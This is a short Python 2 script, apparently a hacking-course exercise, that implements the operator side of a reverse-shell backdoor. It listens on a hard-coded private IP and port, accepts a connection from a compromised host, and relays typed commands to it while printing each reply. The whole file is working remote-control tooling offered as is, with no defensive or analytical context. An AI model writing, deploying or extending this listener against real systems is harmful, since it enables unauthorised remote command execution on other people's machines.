#!/usr/bin/env python

import socket


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # if we lose connection, we should be able to reestablish
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_command(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = raw_input("$-: ")
            print(self.execute_command(command))


my_listener = Listener("192.168.225.179", 8888)
my_listener.run()